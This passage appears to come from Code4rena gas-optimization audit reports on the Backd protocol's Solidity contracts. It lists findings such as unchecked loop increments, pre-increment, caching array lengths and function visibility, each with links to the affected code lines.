[Preparable.sol#L99-L100](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L99-L100) - [Preparable.sol#L112](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L112) - [Preparable.sol#L142-L143](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L142-L143) - [Preparable.sol#L150-L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L150-L151) - [LpGauge.sol#L60](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/LpGauge.sol#L60) - [AmmGauge.sol#L64](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L64)  # unckecked keyword  It's possible to save gas using the `unckecked` keyword around the `i` variable. This will avoid the required checks to ensure that the variable won't overflow, and in the case of this for loop, is almost impossible:  Reference:  - https://docs.soliditylang.org/en/v0.8.0/control-structures.html#checked-or-unchecked-arithmetic  Affected source code:  - [PoolMigrationZap.sol#L22](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L22)  #  `++i` costs less gas compared to `i++` or `i += 1`  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`. I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`. Also, in some of the points mentioned below, it would be necessary to add `unckecked` since said variable is impossible to overflow.  Affected source code:  - [BkdLocker.sol#L140](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140) - [RoleManager.sol#L82](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L82) - [RewardHandler.sol#L42](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L42) - [Controller.sol#L126](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L126) - [StakerVault.sol#L259](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L259) - [BkdLocker.sol#L310](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L310) - [FeeBurner.sol#L56](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L56) - [KeeperGauge.sol#L157](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L157) - [VestedEscrow.sol#L94](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L94) - [InflationManager.sol#L98](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L98) - [InflationManager.sol#L112-L121](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L112-L121) - [InflationManager.sol#L173](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L173) - [InflationManager.sol#L198](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L198) - [InflationManager.sol#L267](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L267) - [InflationManager.sol#L291](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L291) - [InflationManager.sol#L366](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L366) - [InflationManager.sol#L390](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L390) - [InflationManager.sol#L413](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L413) - [InflationManager.sol#L454](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L454)  # Avoid unused returns  Having a method that always returns the same value is not correct in terms of consumption, if you want to modify a value, and the method will perform a `revert` in case of failure, it is not necessary to return a `true`, since it will never be `false`. It is less expensive not to return anything, and it also eliminates the need to double-check the returned value by the caller.  Affected source code:  - [Preparable.sol#L47](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L47) - [Preparable.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L71) - [Preparable.sol#L90](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L90) - [Preparable.sol#L102](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L102) - [StakerVault.sol#L79](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L79) - [StakerVault.sol#L84](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L84) - [StakerVault.sol#L90](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L90) - [StakerVault.sol#L101](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L101) - [AddressProvider.sol#L67](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L67) - [AddressProvider.sol#L74](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L74) - [AddressProvider.sol#L299](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L299) - [LpGauge.sol#L120](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/LpGauge.sol#L120) - [KeeperGauge.sol#L61](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L61) - [KeeperGauge.sol#L89](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L89) - [KeeperGauge.sol#L99](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L99) - [KeeperGauge.sol#L116](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L116) - [VestedEscrow.sol#L86](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L86) - [AmmGauge.sol#L53](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L53) - [AmmGauge.sol#L115](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L115) - [AmmGauge.sol#L137](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L137) - [AmmGauge.sol#L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L151) - [AmmGauge.sol#L160](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L160) - [InflationManager.sol#L62](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L62) - [InflationManager.sol#L72](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L72) - [InflationManager.sol#L102](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L102) - [InflationManager.sol#L124](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L124) - [InflationManager.sol#L142](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L142) - [InflationManager.sol#L178](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L178) - [InflationManager.sol#L202](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L202) - [InflationManager.sol#L233](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L233) - [InflationManager.sol#L275](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L275) - [InflationManager.sol#L300](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L300) - [InflationManager.sol#L318](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L318) - [InflationManager.sol#L347](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L347) - [InflationManager.sol#L371](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L371) - [InflationManager.sol#L395](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L395) - [InflationManager.sol#L437](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L437) - [InflationManager.sol#L488](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L488) - [InflationManager.sol#L578](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L578) - [InflationManager.sol#L592](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L592) - [InflationManager.sol#L606](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L606)  # Improve logic  It's possible to optimize the method `getRoleMember` of the contract `RoleManager` checking first if the `index` is 0.  Before:  ```javascript if (role == Roles.ADDRESS_PROVIDER && index == 0) {             return address(addressProvider);         } else if (role == Roles.POOL_FACTORY && index == 0) {             return addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY);         } else if (role == Roles.CONTROLLER && index == 0) {             return addressProvider.getAddress(AddressProviderKeys._CONTROLLER_KEY);         } else if (role == Roles.POOL) {             return addressProvider.getPoolAtIndex(index);         } else if (role == Roles.VAULT) {             return addressProvider.getVaultAtIndex(index);         } ```  After:  ```javascript if (index == 0) {     if (role == Roles.ADDRESS_PROVIDER) return address(addressProvider);     if (role == Roles.POOL_FACTORY) return addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY);     if (role == Roles.CONTROLLER) return addressProvider.getAddress(AddressProviderKeys._CONTROLLER_KEY); } if (role == Roles.POOL) return addressProvider.getPoolAtIndex(index); if (role == Roles.VAULT) return addressProvider.getVaultAtIndex(index); ```  *Note that also, this change will increase readability.*  Affected source code:  - [RoleManager.sol#L97-L107](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L97-L107)  # Inline improve  El metodo `uncheckedInc` de la libreria `UncheckedMath ` pretenden ahorrar gas, pero suponiendo que el compilador lo optimize al ser mayor a [0.8.2](https://github.com/ethereum/solidity/blob/develop/Changelog.md#082-2021-03-02) y se compile como inline, aun así devolverá un valor a la pila que puede ser evitado. Y además es más optimo utiliza ++a en lugar de a+1;  The `uncheckedInc` method of the `UncheckedMath ` library is intended to save gas, but assuming the compiler optimizes it because it's greater than [0.8.2](https://github.com/ethereum/solidity/blob/develop/Changelog.md#082-2021-03-02), it will still return a value on the stack that can be avoided. And it is also more optimal to use `++a` instead of `a + 1;`.  Affected source code:  - [UncheckedMath.sol#L4-L23](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/libraries/UncheckedMath.sol#L4-L23) 
# [G-01] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  This was found in many places https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L42 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L39 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L56 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L94 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L116 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L259  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-02] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L139 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L254 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L301 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L63 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L117 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L68 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L114 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L84 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L575 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L589 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L602 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L88 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L147 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L158 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L171 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L197  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-03] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas. This is already used in many places with `i = i.uncheckedInc()`.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  There is one loop and that can use this change https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-04] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  There are many places where a value is compared to zero https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L59 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L271 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L97 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L99 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L101 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L57 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Preparable.sol#L28 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L61 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L69 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L53 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L144 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L105 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L133 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L165 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L174 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L183 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L496 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L514 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L522 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L106  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-05] Save gas with unchecked  Use unchecked math when there is no overflow risk to save gas. Before index is decreased in remove it is checked for zero condition. This means index will not underflow and can be unchecked.  These subtractions do not need to be checked for underflows because there is a require earlier that confirms the underflow will not happen. Use the `uncheckedSub` function https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L124 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L338  ## Recommended Mitigation Steps  Add unchecked around math that can't overflow for gas savings. In Solidity before 0.8.0, use the normal math operators instead of safe math functions.  # [G-06] Add payable to functions that won't receive ETH  Identifying a function as payable saves gas. Functions that have a modifier like onlyGovernance or onlyAuthorizedToPause cannot be called by normal users and will not mistakenly receive ETH. These functions can be payable to save gas.  There are many functions that have the auth modifier in the contracts. Some examples are https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L58 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L41 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L45 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L50 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L54 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L111 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L99 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L104 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L147 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L58 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L136 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L167 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L342 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L408 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L435 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L449 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L469 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L33 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L62 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L81 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L89 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L63 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L81 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L216 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L229 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L239 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L256 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L278 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L82 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L87  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-07] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Many modifiers can use this change https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L27 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L16 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L32 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L40 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Pausable.sol#L9 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Pausable.sol#L14 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L47 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L39  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-08] Use newer solidity version  Solidity version 0.8.10 is used. The latest release of solidity includes changes that can provide gas savings. The improvements include:  * Solidity version 0.8.13 can save more gas with [Yul IR pipeline](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/#yul-ir-pipeline-production-ready)  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#upgrade-to-at-least-084  ## Recommended Mitigation Steps  Use solidity release 0.8.13 with Yul IR pipeline and other improvements for gas savings  # [G-09] Non-public variables save gas  Many immutable variables are public, but changing the visibility of any of these variables to private or internal can save gas.  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L42 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L28 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/BkdToken.sol#L14 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L19 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L33 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L38 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L26 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L31 